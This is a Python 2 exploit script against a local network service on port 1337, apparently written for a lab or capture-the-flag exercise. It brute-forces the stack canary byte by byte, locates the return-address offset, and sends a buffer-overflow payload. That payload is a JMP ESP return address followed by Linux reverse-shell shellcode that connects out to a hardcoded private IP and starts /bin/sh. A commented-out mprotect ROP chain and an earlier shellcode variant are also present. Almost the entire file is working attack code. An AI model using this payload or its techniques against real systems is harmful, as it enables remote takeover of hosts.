#!/usr/bin/python

import socket
import sys
import struct
import time
import binascii
import pdb

def p(ptr):
    return struct.pack ('B', ptr)

def pi(ptr):
    return struct.pack ('I', ptr)

def swap32(i):
    return struct.unpack("<I", struct.pack(">I", i))[0]

#payload = "A" * 56
#payload += "BBBB" # Ret Addr

#shellcode = (
#"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x97"
#"\x5b\x68\xc0\xa8\x87\xea\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a"
#"\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\x5b\x99\xb6\x0c\xb0"
#"\x03\xcd\x80\xff\xe1"
#            )

#payload += p(0xb7ef98b0)        # mprotect
#payload += p(0x8048da9)         # pop3ret
#payload += p(0xbffdf000)        # start of the stack
#payload += p(0x21000)           # all pages
#payload += p(0x7)               # RWX
#payload += p(0xb7f806b7)        # JMP ESP

#payload += shellcode

t = 1

RETADDR = 0xb7f806b7 # jmp esp

shellcode = (
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x87\x84\x68"
"\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
"\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
            )

def find_canary_position():
    size = 1
    
    while True:
        payload = "A" * size
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('127.0.0.1',1337))

        print "Sending...: " + payload + " (size: " + str(size) + " byte(s))"
        s.sendall(payload)

        data = s.recv(1024)
        if not data:
            return size - 1
        print "Data received: " + data
        size += 1
        s.close()
#        time.sleep(t)

def find_canary_value(size):
    payload = "A" * size
    canary = ""

    for x in range (0, 4):
        for val in range(0,256):
            ptest = payload
            ptest += p(val)
        
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('127.0.0.1',1337))

            print "Sending PCanary...: " + hex(val) + " | " + ptest
            s.sendall(ptest)

            data = s.recv(1024)
            if not data:
                print "No Data"
                continue
            else:
                s.close()
                payload = ptest
                canary += p(val)
                break;
        if len(canary) == 4:
            print "CAN: " + canary
            return canary

def find_retaddr_position(CANPos, CANVal):
    payload = "A" * CANPos
    payload += pi(CANVal)

    while True:
        payload += p(0x41)
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('127.0.0.1',1337))

        print "Sending...: " + payload + " (size: " + str(len(payload)) + " byte(s))"
        s.sendall(payload)

        data = s.recv(1024)
        if not data:
            return len(payload) - 1
        print "Data received: " + data
        s.close()

def exploit_it(CANPos, CANVal, RETPos):
    payload = "A" * CANPos
    payload += pi(CANVal)
    padding = "A" * (RETPos - CANPos)
    payload += padding
    payload += pi(RETADDR)
    payload += shellcode

    print payload

    print "Entrando em sleep..."
    time.sleep(6)

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('127.0.0.1',1337))

    print "Sending the final payload..."
    s.sendall(payload)

    print "Did you get a shell?"
    s.close()


def main(argv):
    CANPos = find_canary_position()
    print "Buffer size before reach the Stack Cookie: " + str(CANPos)

    CANVal = find_canary_value(CANPos)
    CANVal = swap32(int(binascii.hexlify(CANVal), 16))
    print "Canary Value (little endian): " + hex(CANVal)
#    print binascii.hexlify(CANVal)
#    pdb.set_trace()

    RETPos = find_retaddr_position(CANPos, CANVal)
    print "Buffer size before reach the RET ADDR: " + str(RETPos)

    exploit_it(CANPos, CANVal, RETPos)

if __name__ == "__main__":
    main(sys.argv)
